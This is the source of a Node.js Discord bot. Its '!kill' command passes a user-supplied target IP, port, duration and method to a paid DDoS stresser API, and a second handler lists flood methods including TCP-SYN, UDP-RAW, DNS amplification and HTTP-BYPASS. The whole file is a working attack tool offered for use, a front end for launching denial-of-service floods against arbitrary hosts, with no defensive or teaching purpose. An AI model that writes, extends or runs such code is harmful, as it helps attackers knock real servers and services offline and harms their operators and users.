const express = require('express');
const keep_alive = require('./keep_alive.js')

const app = express();

app.get('/', (req, res) => {
  res.send('Hello Express app!')
});

app.listen(3000, () => {
  console.log('server started');
});

const whitelist = [];
const fetch = require('node-fetch'); 
const { Client, Intents, MessageActionRow, MessageButton, MessageEmbed } = require('discord.js');



const api_key1 = process.env.apikey1;

const intents = new Intents([
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MESSAGES,
    Intents.FLAGS.DIRECT_MESSAGES,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS
]);
const cooldowns = new Map();
const botOwnerId = ['1175855393793126411'];


const bot = new Client({ intents });

bot.once('ready', () => {
    console.log('Bot is ready.');
    bot.user.setActivity('Developer : Hyper Krypton , w dima nikom garena spam')
});


const whitelistedIds = ['1175855393793126411', '1146570719631777813', '793885449873391646', '891809396131254293','754537487346696312','1001532438423535716','926179296828092436'];
const blacklistedIps = [
    { ip: "51.75.255.1", port: 7777 },
    { ip: "176.57.188.154", port: 443 },
];
const blacklistedTargets = ["blacklisted-target.com"];


bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content.startsWith('!kill')) {



        const args = message.content.slice('!kill'.length).trim().split(/ +/);
        const input1 = args[0];
        const input2 = parseInt(args[1]);
        const input3 = parseInt(args[2]);
        const input4 = args[3];

        if (!channelCheck(message)) {
            const embed = new MessageEmbed()
                .setTitle("Command Restricted")
                .setDescription("This command can only be used in <#1210925491213701150> channel.")
                .setColor("#FF0000");

            if (message.channel.type === 'DM') {
                await message.author.send({ embeds: [embed] });
            } else {
                await message.channel.send({ embeds: [embed] });
            }

            return;
        }

        const target_ip = input1;
        const target_port = input2;

        if (blacklistedIps.some(ip => ip.ip === target_ip && ip.port === target_port)) {
            const embed = new MessageEmbed()
                .setTitle("Blacklisted IP")
                .setDescription("The target IP address and port combination is blacklisted and cannot be Killed.")
                .setColor("#FF0000");

            await message.channel.send({ embeds: [embed] });
            return;
        }

        const api_url = `https://api.vacstresser.ru/api?key=${api_key1}&host=${input1}&port=${input2}&method=${input4}&time=${input3}`;
        const headers = {
            'User-Agent': 'Mozila/5.0 (Vacstresser.ru)',
        };

        try {
            const response = await fetch(api_url, { headers });

const successEmbed = new MessageEmbed()
    .setColor("BLACK")
    .setTitle("Kill Sent")
    .setDescription('**__✅ root@127.0.0.1: Krypton Zombies#~ sent Kill ✅__**')
    .addField('👩‍💻 `[User]`', `<@${message.author.id}>`, true) 
    .addField('⚡ `[Ip]`', `**__${input1}__**`, true) 
    .addField('⚡ `[Port]`', `**__${input2}__**`, true) 
    .addField('⌛ `[Time]`', `**__${input3} Secondes__**`, true) 
    .addField('💸 `[Vip]`', `**__Yes__**`, true) 
    .addField('🛡 `[Method]`', `**__${input4}__**`, true)
    .setAuthor(message.author.tag, message.author.displayAvatarURL())
    .setImage('https://cdn.discordapp.com/attachments/1210923346242306128/1211267762698063973/IMG_20240224_170904_272.jpg?ex=65ed9402&is=65db1f02&hm=4a2970bae730591dfe6a1b42f9855b0eb043dac7c810e32b7ac7b0bdeb6320c3&')
    .setTimestamp();


            const errorEmbed = new MessageEmbed()
                .setColor("#FF0000")
                .setTitle("Error")
                .setDescription(`error code: ${response.status} - error reason: ${await response.text()}`);

            if (response.status === 200) {
                await message.channel.send({ embeds: [successEmbed] });
            } else {
                await message.channel.send({ embeds: [errorEmbed] });
            }
        } catch (e) {
            const errorEmbed = new MessageEmbed()
                .setColor("#FF0000")
                .setTitle("Error")
                .setDescription(`Error OO9S93Z: ${e}`);

            await message.channel.send({ embeds: [errorEmbed] });
        }
    }
});

function channelCheck(message) {
    return message.channel.id === '1210925491213701150';  
}




bot.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'methodsButton') {
        const methodsList = [
            "**-------TCP-------**",
            "TCP-ACK - L4",
            "TCP-NFO - L4",
            "TCP-TFO - L4",
            "TCP-OVHv3 - L4",
            "TCP-BYPASS - L4",
            "TCP-SYN - L4",
            "TCP-FIVEM - L4",
            "**-------UDP-------**",
            "UDP-RAW - L4",
            "UDP-RAKNET - L4",
            "UDP-SAMP - L4",
            "UDP-FREEFIRE - L4",
            "**-------AMP-------**",
            "AMP-STUN - L4",
            "AMP-DNS  - L4",
            "**-------L7-------**",
            "HTTP-SOCKET - L7",
            "HTTP-CRANK - L7",
            "HTTP-FLAG - L7",
            "HTTP-BROWSER - L7",
            "HTTP-PLUG - L7",
            "HTTP-BYPASS - L7",
        ];

        const methodsFormatted = methodsList.map(method => `${method}`).join('\n');

        const embed = new MessageEmbed()
            .setTitle("Available Methods")
            .setDescription("root@127.0.0.1: CyberSecurityKrypton#~ showing all available methods")
            .setColor('#2F3136')
            .addField("Methods", methodsFormatted, false);

        await interaction.update({ embeds: [embed], components: [], ephemeral: true });
    }
});





bot.login(process.env.TOKEN);